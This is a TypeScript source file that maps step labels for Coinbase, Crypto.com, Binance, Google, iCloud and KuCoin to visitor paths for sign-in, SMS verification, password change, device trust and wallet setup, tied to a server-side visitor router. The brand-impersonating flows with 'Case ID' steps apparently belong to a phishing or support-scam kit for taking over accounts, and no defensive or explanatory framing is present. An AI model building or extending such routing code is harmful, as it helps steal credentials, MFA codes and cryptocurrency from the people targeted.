/**
 * Client-safe map from flow step labels (Brand/Page) to visitor URL paths.
 * Keep in sync with src/lib/server/visitorRouter.ts PATH_TO_TEMPLATE.
 */
const FLOW_STEP_PATHS: Record<string, string> = {
	'Coinbase/Loading': '/loading',
	'Coinbase/Case ID': '/case',
	'Coinbase/Activity': '/dashboard',
	'Coinbase/Balance': '/dashboard',
	'Coinbase/External': '/signin/url',
	'Coinbase/Review Login': '/sign-in',
	'Coinbase/Change Password': '/signin/change-password',
	'Coinbase/SMS Verify': '/signin/sms',
	'Coinbase/Trust Device': '/signin/trust-device',
	'Coinbase/Terminate Devices': '/signin/terminate-devices',
	'Coinbase/Vault Setup': '/wallet/setup',
	'CDC/Loading': '/loading',
	'CDC/Case ID': '/case',
	'CDC/Activity': '/dashboard',
	'CDC/Balance': '/dashboard',
	'CDC/External': '/wallet',
	'CDC/Wallet': '/wallet',
	'Binance/Loading': '/loading',
	'Binance/Case': '/case',
	'Binance/Activity': '/dashboard',
	'Binance/Balance': '/dashboard',
	'Binance/Backup': '/loading',
	'Google/Loading': '/loading',
	'Google/Login': '/login',
	'iCloud/Login': '/login',
	'KuCoin/Loading': '/loading'
};

const FLOW_LABEL_RE = /^[A-Z][^/]+\/.+/;

export function isValidFlowStepLabel(step: string): boolean {
	return FLOW_LABEL_RE.test(step);
}

/** Resolve the visitor landing path for a flow's first valid step. */
export function flowLandingPathForSteps(steps: string[], _module?: string): string | null {
	const first = steps.find((s) => isValidFlowStepLabel(s));
	if (!first) return null;
	return FLOW_STEP_PATHS[first] || null;
}
